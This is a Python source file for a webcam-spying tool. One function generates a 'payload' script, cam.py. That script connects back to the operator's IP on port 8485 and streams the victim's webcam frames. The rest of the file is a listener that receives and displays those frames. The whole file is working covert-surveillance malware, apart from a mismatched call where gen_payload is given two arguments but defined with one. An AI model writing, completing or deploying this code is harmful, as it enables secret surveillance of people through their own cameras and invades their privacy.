import socket
import cv2
import pickle
import struct 
from colorama import Fore,deinit,init

def gen_payload(ip):
    f=open("cam.py","w")
    cont='import cv2\nimport socket\nimport struct\nimport pickle\nprint("importation OK")\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect((\''
    cont+=ip
    cont+='\', 8485))\nconnection = client_socket.makefile(\'wb\')\nprint("connection OK")\ncam = cv2.VideoCapture(0)\n\ncam.set(3, 320)\ncam.set(4, 240)\n\nimg_counter = 0\n\nencode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]\nprint("connection et image OK")\nwhile True:\n    ret, frame = cam.read()\n    result, frame = cv2.imencode(\'.jpg\', frame, encode_param)\n#    data = zlib.compress(pickle.dumps(frame, 0))\n    data = pickle.dumps(frame, 0)\n    size = len(data)\n\n\n    #print("{}: {}".format(img_counter, size))\n    client_socket.sendall(struct.pack(">L", size) + data)\n    img_counter += 1\n    \n    c = cv2.waitKey(1)\n    if c == 27:\n        break\n\ncam.release()\ncv2.destroyAllWindows()'
    f.write(cont)
    f.close()

def get_ip():
    """"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        HOST=s.getsockname()[0]
        s.close()
    except:
        HOST="192.168.56.1"
    return HOST


def webcam():
    init()
    
    HOST : str = get_ip()
    PORT=8485
    
    gen_payload(HOST,PORT)

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print(Fore.GREEN)
    print('Socket created')
    print(Fore.WHITE)
    print('Socket bind ...')
    s.bind((HOST,PORT))
    print('Socket bind',Fore.GREEN,'complete')
    s.listen(10)
    print(Fore.WHITE)
    print('Socket now listening')

    conn,addr=s.accept()
    print(Fore.GREEN)
    print("Client connected")
    print(Fore.WHITE)
    data = b""
    payload_size = struct.calcsize(">L")
    #print("payload_size: {}".format(payload_size))
    while True:
        while len(data) < payload_size:
            #print("Recv: {}".format(len(data)))
            data += conn.recv(4096)

        #print("Done Recv: {}".format(len(data)))
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack(">L", packed_msg_size)[0]
        #print("msg_size: {}".format(msg_size))
        while len(data) < msg_size:
            data += conn.recv(4096)
        frame_data = data[:msg_size]
        data = data[msg_size:]

        frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
        cv2.imshow('ImageWindow',frame)
        if cv2.waitKey(1)==ord('q'):
            cv2.destroyAllWindows()
            break

if __name__ == "__main__":
    webcam()